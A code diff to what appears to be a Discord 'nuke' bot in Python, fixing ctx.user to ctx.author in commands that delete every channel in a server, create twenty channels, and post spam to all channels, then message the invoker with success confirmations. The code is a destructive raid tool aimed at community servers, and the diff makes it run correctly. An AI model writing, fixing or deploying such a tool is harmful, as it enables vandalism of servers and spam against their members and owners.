@@ -49,7 +49,7 @@ async def on_ready():
 async def nuke(ctx):
     guild = ctx.guild
     channels = guild.channels
-    user = ctx.user
+    user = ctx.author
     for channels in channels:
         await channels.delete()
     
@@ -68,7 +68,7 @@ async def nuke(ctx):
 async def delchan(ctx):
     guild = ctx.guild
     channels = guild.channels
-    user = ctx.user
+    user = ctx.author
     for channels in channels:
         await channels.delete()
     await user.send(f"{user.mention} Successfully Deleted All Channels !")
@@ -77,7 +77,7 @@ async def delchan(ctx):
 async def createchan(ctx):
     guild = ctx.guild
     channels = guild.channels
-    user = ctx.user
+    user = ctx.author
     for _ in range(20):
         await guild.create_text_channel(name=channelname)
     await user.send(f"{user.mention} Successfully Created All Channels !")
@@ -86,7 +86,7 @@ async def createchan(ctx):
 async def ping(ctx):
     guild = ctx.guild
     channels = guild.channels
-    user = ctx.user
+    user = ctx.author
     for channels in channels:
         await channels.send(spammsg)
     await user.send(f"{user.mention} Successfully Spammed in Server !")
